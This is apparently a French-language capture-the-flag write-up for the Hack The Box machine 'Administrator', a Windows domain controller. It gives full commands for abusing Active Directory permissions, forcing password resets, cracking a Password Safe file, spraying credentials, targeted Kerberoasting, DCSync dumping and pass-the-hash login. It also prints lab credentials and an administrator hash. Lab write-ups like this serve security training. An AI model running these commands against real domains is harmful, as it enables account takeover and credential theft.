---
date: 2025-04-20T00:38:38-05:00
# description: ""
image: "/images/HTB-Administrator/Administrator.png"
showTableOfContents: true
tags: ["HackTheBox"]
categories: ["Writeups"]
title: "HTB: Administrator"
type: "post"
---

* Platforme: Hack The Box
* Lien: [Administrator](https://app.hackthebox.com/machines/Administrator)
* Niveau: Moyen
* OS: Windows
---

> Cette box est un scénario de violation supposée, nous avons des identifiants pour le compte suivant : **Nom d'utilisateur:** Olivia **Mot de passe:** ichliebedich

L'exploitation commence par l'utilisation des identifiants fournis pour exécuter BloodHound, ce qui révèle un chemin d'attaque impliquant les permissions `GenericAll` et `ForceChangePassword`. En exploitant ces autorisations, nous compromettons des comptes utilisateurs et accédons au serveur FTP contenant un fichier de base de données Password Safe (`psafe3`). L'extraction des informations d'identification de cette base de données nous donne un accès initial au système. En poursuivant l'énumération, nous découvrons un vecteur d'escalade de privilèges avec les permissions `GenericWrite` et `DCSync`, ce qui nous permet de récupérer le hash de l'administrateur du domaine.

## Balayage

```
nmap -sC -sV -oA nmap/Administrator 10.129.61.195
```

**Résultats**

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-22 18:18 CDT
Nmap scan report for 10.129.61.195
Host is up (0.060s latency).
Not shown: 988 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-23 06:19:04Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m59s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-04-23T06:19:10
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.00 seconds
```

La cible est un contrôleur de domaine utilisant les services courants d'Active Directory tels que Kerberos et LDAP. Nous notons également la présence du service FTP (Microsoft ftpd) sur le port 21. Le nom de domaine est `administrator.htb`.

En exécutant `netexec smb {TARGET_IP}` nous découvrons que le nom de la machine cible est `DC`, nous l'ajouterons également au fichier hosts.

![Machine name](/images/HTB-Administrator/machine_name.png)

```
sudo echo "{TARGET_IP} administrator.htb dc.administrator.htb" | sudo tee -a /etc/hosts
```

## Enumération

Commençons l'énumération avec les identifiants fournis. L'utilisateur n'a accès qu'aux partages par défaut. 

```
netexec smb 10.129.61.195 -u Olivia -p ichliebedich
```

![Olivia available shares](/images/HTB-Administrator/olivia_shares.png)

Examinons le service FTP.

```
netexec ftp 10.129.61.195 -u olivia -p ichliebedich
```

![Olivia access to FTP](/images/HTB-Administrator/olivia_FTP.png)

Olivia ne peut pas accéder au service FTP, probablement en raison d'un manque d'autorisations.

Puisque nous disposons d'informations d'identification valides, lançons Bloodhound.

```
bloodhound-python -c all -u Olivia -p ichliebedich  -d administrator.htb -ns 10.129.61.195
```

Avec Bloodhound, nous découvrons que `Olivia` a la permission `GenericAll` sur `Michael`, ce qui lui donne un contrôle total sur lui. 

![Olivia GenericAll permission](/images/HTB-Administrator/Olivia_GenericAll.png)

Nous découvrons également que `Michael` a la permission `ForceChangePassword` sur `Benjamin`, ce qui nous permet de changer de force son mot de passe si nous réussissons à prendre le contrôle du compte de `Michael`.

![Michael ForceChangePassword permission](/images/HTB-Administrator/Michael_ForceChangePassword.png)


```
net rpc password "Michael" "Paswword#@2024" -U "administrator.htb"/"Olivia"%"ichliebedich" -S "dc.administrator.htb"

netexec smb 10.129.61.195 -u michael -p "Paswword#@2024"
```
Nous modifions avec succès le mot de passe de `Michael` et nous nous connectons via SMB.

![Michael password change](/images/HTB-Administrator/Michael_pwd_change.png)

Ensuite, nous modifions le mot de passe de `Benjamin`.

```
net rpc password "Benjamin" "Paswword#@2025" -U "administrator.htb"/"Michael"%"Paswword#@2024" -S "dc.administrator.htb"

netexec smb 10.129.61.195 -u benjamin -p "Paswword#@2025"
```

L'opération est un succès!

![Benjamin password change](/images/HTB-Administrator/Benjamin_pwd_change.png)

Ce compte ne dispose également que d'un accès de base aux partages SMB.

![Benjamin SMB shares](/images/HTB-Administrator/benjamin_SMB.png)

Cependant, nous constatons que `Benjamin` est membre du groupe `Share Moderators`, et qu'il a très probablement les permissions d'accéder aux partages sur ce serveur. 

![Share Moderator group](/images/HTB-Administrator/Share_Moderators.png)

## Accès initial

`Benjamin` est en mesure de se connecter au serveur FTP.

![Benjamin FTP](/images/HTB-Administrator/Benjamin_FTP.png)

Il y a un fichier appelé `Backup.psafe3` que nous téléchargeons.

> Bien que cela ne semble pas avoir d'importance dans ce cas, à chaque fois que vous obtenez une erreur du type `WARNING! x bare linefeeds received in ASCII mode.`, vvous devez probablement exécuter la commande `bin` dans FTP puis télécharger le fichier à nouveau pour éviter tout problème.

![FTP file](/images/HTB-Administrator/FTP_file.png)

Hashcat est capable de cracker le fichier psafe3 avec le mode `5200`.

```
hashcat -a 0 -m 5200 Backup.psafe3 /usr/share/wordlists/rockyou.txt
```

> Un fichier `.psafe3` est un fichier de base de données Password Safe. Il est utilisé par l'application Password Safe, un gestionnaire de mots de passe open-source.

Nous récupérons le mot de passe `tekieromucho`.

![psafe3 password cracked](/images/HTB-Administrator/hashcat_pwd.png)

Si vous ne l'avez pas encore, téléchargez l'application avec `sudo apt install passwordsafe` et utilisez le fichier ainsi que le mot de passe récupéré pour accéder aux mots de passe.

A l'intérieur du fichier, nous trouvons plusieurs identifiants.

![psafe3 credentials](/images/HTB-Administrator/psafe3_creds.png)
 
Après avoir créé une liste d'utilisateurs et une liste de mots de passe, nous pouvons effectuer une attaque par force brute afin de trouver les informations d'identification valides.

```
netexec smb 10.129.61.195 -u users.txt -p pwds.txt --continue-on-success
```

![Emily valid password](/images/HTB-Administrator/emily_valid.png)

Les identifiants valides sont `emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb`. Nous nous connectons avec `evil-winrm` et récupérons le drapeau utilisateur.

```
evil-winrm -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -i administrator.htb
```

![user flag](/images/HTB-Administrator/user_flag.png)

## Elévation de Privilèges

Emily a la permission `GenericWrite` sur `Ethan`.

![GenericWrite permission](/images/HTB-Administrator/emily_GenericWrite.png)

`GenericWrite` peut être utilisé abusivement pour lancer une attaque Kerberost ciblée.

```
sudo ntpdate {TARGET_IP}

python3 targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```

![Ethan hash](/images/HTB-Administrator/targeted_kerberoast.png)

Nous craquons le hachage avec hashcat et récupérons le mot de passe `limpbizkit`.

```
hashcat ethan_hash.txt /usr/share/wordlists/rockyou.txt
```

![Ethan password cracked](/images/HTB-Administrator/ethan_pwd.png)

`Ethan` a la permission `DCSync` sur le domaine.

> `DCSync` permet à un utilisateur ou à un groupe de simuler le comportement d'un contrôleur de domaine, en particulier pour répliquer les données de mot de passe, y compris les hachages NTLM, les secrets Kerberos (krbtgt), et même les informations d'identification du contrôleur de domaine.

![DCSync permission](/images/HTB-Administrator/Ethan_DCSync.png)

Nous pouvons l'utiliser pour récupérer le hash de l'administrateur.

```
impacket-secretsdump.py 'Administrator.htb/ethan:limpbizkit'@'dc.administrator.htb'
```

![DCSync attack](/images/HTB-Administrator/DCSync_administrator.png)

Nous nous connectons avec le hash de l'administrateur et récupérons le drapeau root.

```
evil-winrm -u 'Administrator' -H "3dc553ce4b9fd20bd016e098d2d2fd2e" -i {TARGET_IP}
```

![root flag](/images/HTB-Administrator/root_flag.png)




